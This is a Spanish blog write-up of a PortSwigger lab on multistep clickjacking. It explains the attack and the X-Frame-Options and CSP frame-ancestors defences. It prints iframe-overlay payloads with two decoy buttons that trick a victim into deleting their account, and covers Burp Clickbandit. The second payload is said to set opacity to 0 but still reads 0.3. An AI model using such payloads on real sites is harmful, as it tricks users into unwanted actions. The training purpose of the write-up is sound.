---
title: "Multistep clickjacking"
description: "Laboratorio de Portswigger sobre Clickjacking"
date: 2025-04-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Clickjacking
tags:
  - Portswigger Labs
  - Clickjacking
  - Multistep clickjacking
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` tiene una funcionalidad de `cuenta` protegida por un `token CSRF` y un `diálogo de confirmación` para defenderse contra el `Clickjacking`. Para `resolver` este `laboratorio`, debemos realizar un `ataque de Clickjacking` que engañe al `usuario` para que haga clic en el `botón de eliminación de cuenta` y en el `diálogo de confirmación`, utilizando las acciones señuelo `"Click me first"` y `"Click me next"`. Necesitaremos usar `dos elementos` para este `laboratorio`. Podemos `iniciar sesión` en la `cuenta` utilizando las credenciales `wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/Clickjacking-Lab-5/image_1.png)

Hacemos `click` sobre  `My account` y nos logueamos con las credenciales `wiener:peter`

![](/assets/img/Clickjacking-Lab-5/image_2.png)

Vemos que podemos `cambiar` nuestro `email` y que podemos `eliminar` la `cuenta`

![](/assets/img/Clickjacking-Lab-5/image_3.png)

Si pulsamos sobre `Delete account` nos `pide` una `confirmación` para `eliminar` nuestra `cuenta`

![](/assets/img/Clickjacking-Lab-5/image_4.png)

Si pulsamos sobre `View post` vemos que hay una `sección` de `comentarios`

![](/assets/img/Clickjacking-Lab-5/image_5.png)

En un `ataque` de `Clickjacking`, el atacante `superpone` u `oculta elementos maliciosos` en una `página web legítima`, por ejemplo, usando un `iframe`, de modo que cuando el `usuario` hace `click` en un `elemento aparentemente seguro` de una `página web`, en realidad, está haciendo `click` en un `elemento oculto` y ejecutando una `acción no deseada`

Por ejemplo, un `usuario` accede a una `página web` (quizás mediante un `enlace` proporcionado por un `correo electrónico`) y hace `click` en un `botón` para ganar un `premio`. Sin saberlo, ha sido engañado por un `atacante` para presionar un `botón oculto`, lo que resulta la realización de una `compra` en otra `web`

Este `ataque` se diferencia de un `ataque CSRF` en que el `usuario` debe realizar una `acción`, como hacer `click en un botón`, mientras que un `ataque CSRF` se basa en la `suplantación` de una `solicitud completa` sin el `conocimiento` o la `interacción` del `usuario`

La `protección` contra los `ataques CSRF` suele proporcionarse mediante el uso de un `token CSRF` vinculado a una `cookie` de `sesión`. Los `tokens CSRF` no puede bloquear un `ataque de Clickjacking` porque el `navegador` enviará `automáticamente` el `token CSRF`, esto es debido a que el `ataque` ocurre dentro de la `sesión del usuario` y dentro del `propio dominio`. Por lo tanto, la única diferencia con una `sesión normal`, sería que el `proceso` ocurre dentro de un `iframe oculto`

Los `ataques de Clickjacking` utilizan `CSS` para crear y manipular `capas`. El `atacante` incorpora el `sitio web legítimo` como una `capa iframe` superpuesta sobre `elementos maliciosos`

Un `ejemplo` utilizando la `etiqueta style` y sus `parámetros` es el siguiente

```
<head>
    <style>
        #target_website {
            position: relative;
            width: 128px;
            height: 128px;
            opacity: 0.00001;
            z-index: 2;
        }
        #decoy_website {
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
        }
    </style>
</head>
...
<body>
    <div id="decoy_website">
        ...decoy web content here...
    </div>
    <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
</body>
```

El `iframe` del `sitio web legítimo` se `posiciona` dentro del `navegador` de manera que haya una `superposición precisa` de la `acción` con los `elementos maliciosos`, utilizando valores adecuados de `ancho`, `alto` y `posición`

Se emplean valores de `posición absoluta` y `relativa` para garantizar que el `sitio web objetivo` se `superponga` correctamente al `sitio de distracción`, sin importar el `tamaño de pantalla`, el `tipo de navegador` o la `plataforma`

El `z-index` determina el `orden de apilamiento` del `iframe` y las `capas del sitio web`. El valor de `opacidad` se define en `0.0` (o cerca de `0.0`), haciendo que el `contenido del iframe` sea `transparente` para el `usuario`

Hay algunas `protecciones contra Clickjacking` en los `navegadores` que pueden `detectar la transparencia en iframes` mediante `umbrales`. Para `eludir` esto, el `atacante` debe `ajustar los valores de opacidad` de manera que el `efecto deseado` se logre sin `activar` las `protecciones`. Esta `medida de protección` no está presente en `todos los navegadores`. Por ejemplo, `Chrome versión 76` incluye este `comportamiento`, pero `Firefox` no. Esto significa que, `según el navegador`, podemos necesitar `modificar` el `payload`

Aunque podemos `crear manualmente` una `PoC` de un `ataque de Clickjacking` como se describió anteriormente, esto puede ser `tedioso` y `consumir mucho tiempo`. Cuando `probamos` el `Clickjacking` en entornos reales, es recomendable usar la herramienta `Clickbandit` [https://portswigger.net/burp/documentation/desktop/tools/clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit) de `Burpsuite`, la cual nos permite usar nuestro `navegador` para `realizar las acciones deseadas` en la `página web cargada mediante el iframe` y luego `genera` un `archivo HTML` con una `superposición` para explotar el `Clickjacking`

Existen varias `medidas defensivas` contra `Clickjacking` del `lado del cliente`, sin embargo, a menudo, los `atacantes` pueden `eludir estas protecciones` con relativa `facilidad`. En consecuencia, se han desarrollado `protocolos implementados en el lado del servidor` que `restringen el uso de iframes` en el `navegador` y por lo tanto, `mitigan el Clickjacking`

El `Clickjacking` es un `comportamiento` que ocurre en el `lado del cliente`, y su `éxito` o `fracaso` depende de las `funcionalidades del navegador` y su `conformidad` con los `estándares web` y las `mejores prácticas actuales`. La `protección en el servidor` contra el `Clickjacking` se logra `definiendo` y `comunicando restricciones` sobre el `uso de componentes` como los `iframes`. No obstante, la `eficacia` de estas `protecciones` depende de que el `navegador` `cumpla` y `aplique` dichas `restricciones`

Dos `mecanismos clave` para la `protección contra Clickjacking` desde el `servidor` son `X-Frame-Options` y `Content Security Policy (CSP)`

`X-Frame-Options` - Fue introducido originalmente como una `cabecera de respuesta no oficial` en `Internet Explorer 8` y fue `rápidamente adoptado` por otros `navegadores`. Esta `cabecera` permite al propietario del sitio web `controlar el uso de iframes u objetos`, de modo que no es posible `cargar una página web desde en un iframe` puede ser `prohibida` con la `directiva deny`

```
X-Frame-Options: deny
```

Alternativamente, se puede `restringir` que un `iframe` cargue `contenido` solo si pertenece al `mismo origen` (mismo `dominio`, `protocolo` y `puerto`) que la `página que lo contiene`. Si el `origen` es `diferente`, el `iframe` no se `cargará`.

```
X-Frame-Options: sameorigin
```

O también puede `permitirse` únicamente que se `cargue` un `sitio web específico` en un `iframe` mediante la `directiva allow-from`

```
X-Frame-Options: allow-from https://normal-website.com
```

`Content Security Policy (CSP)` - Es un `mecanismo de detección y prevención` que proporciona `mitigación` contra ataques como `XSS` y de `Clickjacking`. `CSP` suele implementarse en el `servidor web` como un `encabezado de respuesta` con el siguiente formato

```
Content-Security-Policy: policy
```

La `Content Security Policy (CSP)` proporciona al `navegador` un `listado de fuentes` que considera `legítimas` (dominios, protocolos, scripts específicos) y que el `navegador` puede utilizar para la `detección` e `intercepción de comportamientos maliciosos`

La `protección recomendada contra Clickjacking` consiste en `incorporar` la `directiva frame-ancestors` en la `Content Security Policy (CSP)` de la aplicación

- La directiva `frame-ancestors 'none'` tiene un `comportamiento similar` a `X-Frame-Options: deny`
    
- La directiva `frame-ancestors 'self'` es `equivalente` a `X-Frame-Options: sameorigin`

La siguiente `Content Security Policy (CSP)` no permite que se `cargue la web` desde `otros sitios web externos` mediante un `iframe`. Sin embargo, sí que se puede `cargar la web` mediante un `iframe` si se hace desde la `misma web` que `aplica` la `Content Security Policy (CSP)`

```
Content-Security-Policy: frame-ancestors 'self';
```

Alternativamente, se puede `permitir` que solo se pueda `cargar la web` desde `sitios web específicos`

```
Content-Security-Policy: frame-ancestors normal-website.com;
```

Hay que recalcar que `X-Frame-Options` no está `implementado de forma uniforme` en todos los `navegadores` (por ejemplo, la `directiva allow-from` no es `compatible` con `Chrome 76` ni con `Safari 12`). Sin embargo, cuando se `aplica correctamente` junto con `Content Security Policy (CSP)`, puede proporcionar una `protección efectiva` contra `ataques de Clickjacking`

Para ver si una `web` es `vulnerable` a `Clickjacking` podemos usar la herramienta `shcheck` [https://github.com/santoru/shcheck.git]https://github.com/santoru/shcheck.git() para `identificar` las `cabeceras de seguridad`

```
# shcheck.py -i -x -k https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/   

======================================================
 > shcheck.py - santoru ..............................
------------------------------------------------------
 Simple tool to check security headers on a webserver 
======================================================

[*] Analyzing headers of https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[!] URL Returned an HTTP error: 404
[*] Effective URL: https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[!] Missing security header: X-XSS-Protection
[!] Missing security header: X-Frame-Options
[!] Missing security header: X-Content-Type-Options
[!] Missing security header: Strict-Transport-Security
[!] Missing security header: Content-Security-Policy
[!] Missing security header: X-Permitted-Cross-Domain-Policies
[!] Missing security header: Referrer-Policy
[!] Missing security header: Expect-CT
[!] Missing security header: Permissions-Policy
[!] Missing security header: Cross-Origin-Embedder-Policy
[!] Missing security header: Cross-Origin-Resource-Policy
[!] Missing security header: Cross-Origin-Opener-Policy

[*] No information disclosure headers detected

[*] No caching headers detected
-------------------------------------------------------
[!] Headers analyzed for https://0adf00d004447ab3839b46d000cc000b.web-security-academy.net/
[+] There are 0 security headers
[-] There are not 12 security headers
```

Si preferimos usar una herramienta `web` podemos usar `securityheaders` [https://securityheaders.com/](https://securityheaders.com/) 

![](/assets/img/Clickjacking-Lab-5/image_6.png)

En este caso, vemos que la `web` no tiene ni `Content-Security-Policy (CSP)` ni `X-Frame-Options`, lo cual la hace vulnerable a `Clickjacking`

Hay veces en las que `el atacante necesita que el usuario víctima realice múltiples clicks`. Por ejemplo, un `atacante` podría querer `engañar` a un `usuario` para que `compre algo` en un `sitio web de ventas`, por lo que los `artículos` deben `añadirse` a un `carrito de compras` antes de `realizar el pedido` y posteriormente se necesitaría otro `click` para `procesar` el `pago`.

Estas `acciones` pueden ser `implementadas` por el `atacante` utilizando múltiples `iframes`. Estos `ataques` requieren una `precisión considerable` y `cuidado` desde la `perspectiva del atacante` si se quiere que sean `efectivos` y `sigilosos`

Nos dirigimos al `Exploit server` y nos `creamos` este `payload`

```
<style>
	iframe {
		position:relative;
		width:400;
		height: 550;
		opacity: 0.3;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495;
		left:150;
		z-index: 1;
	}
   .secondClick {
		top:315;
		left:155;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a77006f03f4bcd5893ea08800a90071.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-5/image_7.png)

Pulsamos sobre `View exploit` para comprobar que está bien `centrado` el `texto`

![](/assets/img/Clickjacking-Lab-5/image_8.png)

![](/assets/img/Clickjacking-Lab-5/image_9.png)

Una vez que hemos comprobado que está bien `centrado`, le `cambiamos` la `opacidad` a `0`

```
<style>
	iframe {
		position:relative;
		width:400;
		height: 550;
		opacity: 0.3;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:495;
		left:150;
		z-index: 1;
	}
   .secondClick {
		top:315;
		left:155;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a77006f03f4bcd5893ea08800a90071.web-security-academy.net/my-account"></iframe>
```

![](/assets/img/Clickjacking-Lab-5/image_10.png)

Si pulsamos sobre `View exploit` así es como se vería

![](/assets/img/Clickjacking-Lab-5/image_11.png)

Otra forma alternativa sería usando la herramienta `Clickbandit` de `Burpsuite`, para usarla nos dirigimos a `Burpsuite` y pulsamos `Burp > Burp Clickbandit`

![](/assets/img/Clickjacking-Lab-5/image_12.png)

Pulsamos sobre `Copy Clickbandit to clipboard`

![](/assets/img/Clickjacking-Lab-5/image_13.png)

Nos dirigimos a `Chrome`, accedemos a `My account`, nos `logueamos`, abrimos la `consola de desarrollador` y `pegamos` ahí todo el `código`

![](/assets/img/Clickjacking-Lab-5/image_14.png)

Una vez hecho esto nos saldrá este `menú`

![](/assets/img/Clickjacking-Lab-5/image_15.png)

Pulsamos en `Start` y posteriormente hacemos `click` sobre `Delete account`

![](/assets/img/Clickjacking-Lab-5/image_16.png)

El siguiente paso es marcar la casilla `Disable click actions` y pulsar sobre `Yes`

![](/assets/img/Clickjacking-Lab-5/image_17.png)

![](/assets/img/Clickjacking-Lab-5/image_18.png)

Una vez hecho esto, `pulsamos` sobre `Finish` y se nos `mostrará` como es nuestro `payload` actualmente. Para `ver` la `segunda parte` necesitamos hacer `click` en `Delete account`

![](/assets/img/Clickjacking-Lab-5/image_19.png)

![](/assets/img/Clickjacking-Lab-5/image_20.png)

Usando los símbolos `-` y `+`, podemos `subir` o `bajar` el `aumento`, y con `Toogle transparency` podemos `activar` o `desactivar` la `transparencia`. En mi caso, lo voy a dejar de esta forma. Cuando ya lo tengamos como queremos, pulsamos en `Save` y se nos `descargará` un `documento HTML`

![](/assets/img/Clickjacking-Lab-5/image_21.png)

`Pegamos` el `código` en el `Exploit server`

![](/assets/img/Clickjacking-Lab-5/image_22.png)

Pulsamos sobre `View exploit` para ver si se ve correctamente. Una vez que hemos `comprobado` que `funcionan` ambos `payloads`, nos dirigimos al `Exploit server` y pulsamos sobre `Deliver exploit to victim`

![](/assets/img/Clickjacking-Lab-5/image_23.png)

![](/assets/img/Clickjacking-Lab-5/image_24.png)

![](/assets/img/Clickjacking-Lab-5/image_25.png)
